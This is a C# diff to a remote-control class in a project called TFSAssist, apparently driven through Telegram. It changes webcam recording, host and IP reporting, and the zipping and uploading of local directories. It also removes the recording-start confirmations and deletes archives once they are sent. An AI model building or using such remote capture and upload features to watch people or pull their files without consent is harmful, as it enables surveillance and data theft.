@@ -9,6 +9,7 @@ using System.Linq;
 using System.Net;
 using System.Reflection;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using TeleSharp.TL;
 using TFSAssist.Control;
@@ -31,6 +32,8 @@ namespace TFSAssist
             }
         }
 
+        public Thread MainThread { get; }
+
         private readonly string ClientID;
         private TTLControl _control;
         private readonly StringBuilder _processingErrorLogs;
@@ -50,8 +53,9 @@ namespace TFSAssist
         public string TempDirectory { get; }
         public bool IsEnabled { get; private set; } = false;
 
-        public RemoteControl(string clientId, Action checkUpdates, Func<string> getLogs)
+        public RemoteControl(Thread mainThread, string clientId, Action checkUpdates, Func<string> getLogs)
         {
+            MainThread = mainThread;
             _processingErrorLogs = new StringBuilder();
             _checkUpdates = checkUpdates;
             _getLogs = getLogs;
@@ -362,7 +366,6 @@ namespace TFSAssist
                                 }
 
                                 _aforgeCapture.StartCamRecording();
-                                await SendMessageToCurrentUser($"Started. Finished after {_aforgeCapture.SecondsRecordDuration} seconds.");
 
                                 break;
 
@@ -374,7 +377,6 @@ namespace TFSAssist
                                 }
 
                                 _encoderCapture.StartCamRecording();
-                                await SendMessageToCurrentUser($"Started. Finished after {_encoderCapture.SecondsRecordDuration} seconds.");
 
                                 break;
                         }
@@ -415,10 +417,12 @@ namespace TFSAssist
                     if (destinationZip != null && File.Exists(destinationZip))
                     {
                         await SendBigFileToCurrentUser(destinationZip);
+                        File.Delete(destinationZip);
                     }
                 }
                 catch (Exception ex)
                 {
+                    GC.Collect();
                     WriteExLog(ex);
                 }
 
@@ -426,6 +430,9 @@ namespace TFSAssist
                 {
                     foreach (var fileName in tempFiles)
                     {
+                        if(!IO.IsFileReady(fileName))
+                            continue;
+
                         var fileInfo = new FileInfo(fileName);
                         fileInfo.Attributes = FileAttributes.Normal;
                         fileInfo.Delete();
@@ -511,7 +518,35 @@ namespace TFSAssist
                 string destinationZip = Path.Combine(sourceDir, STRING.RandomStringNumbers(15) + ".zip");
                 string packFileTempPath = Path.GetTempFileName();
                 File.Delete(packFileTempPath);
-                ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);
+
+                int fileToArchive = 0;
+                using (FileStream zipToOpen = new FileStream(packFileTempPath, FileMode.OpenOrCreate))
+                {
+                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Update))
+                    {
+                        DirectoryInfo d = new DirectoryInfo(sourceDir);
+                        FileInfo[] Files = d.GetFiles("*", SearchOption.AllDirectories);
+                        foreach (FileInfo file in Files)
+                        {
+                            if (IO.IsFileReady(file.FullName))
+                            {
+                                string destArchPth = file.FullName.Replace(sourceDir, "").Trim('\\');
+                                archive.CreateEntryFromFile(file.FullName, destArchPth);
+                                fileToArchive++;
+                            }
+                        }
+                    }
+                }
+
+                if (fileToArchive == 0)
+                {
+                    if (File.Exists(packFileTempPath))
+                        File.Delete(packFileTempPath);
+                    return null;
+                }
+
+                //ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);
+
                 File.Copy(packFileTempPath, destinationZip, true);
                 File.Delete(packFileTempPath);
                 return destinationZip;
@@ -529,9 +564,9 @@ namespace TFSAssist
                 var hostName = Dns.GetHostName();
 
                 if (detailed)
-                    return $"Host=[{hostName}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
+                    return $"Host=[{hostName}] Thread=[IsAlive={MainThread.IsAlive}; ID={MainThread.ManagedThreadId}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
 
-                return $"Host=[{hostName}]";
+                return $"Host=[{hostName}] Thread=[IsAlive={MainThread.IsAlive}; ID={MainThread.ManagedThreadId}]";
             }
             catch (Exception)
             {
@@ -683,7 +718,7 @@ namespace TFSAssist
 
             try
             {
-                _aforgeCapture = new AForgeCapture(_aforgeDevices, _encDevices, TempDirectory, 60);
+                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, TempDirectory, 20);
                 _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
                 _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
             }
@@ -694,7 +729,7 @@ namespace TFSAssist
 
             try
             {
-                _encoderCapture = new EncoderCapture(_aforgeDevices, _encDevices, TempDirectory, 60);
+                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, TempDirectory, 20);
                 _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
             }
             catch (Exception ex)
@@ -710,6 +745,24 @@ namespace TFSAssist
 
         private async void OnRecordingCompleted(object sender, MediaCaptureEventArgs args)
         {
+            if (args == null)
+                return;
+            if (args.Error != null)
+                WriteExLog(args.Error);
+
+            if (string.IsNullOrWhiteSpace(args.DestinationFile) || !File.Exists(args.DestinationFile))
+                return;
+
+            int tryCount = 0;
+            while (!IO.IsFileReady(args.DestinationFile))
+            {
+                if (tryCount >= 5)
+                    return;
+
+                await Task.Delay(1000);
+                tryCount++;
+            }
+
             await SendPreparedFiles();
         }
 
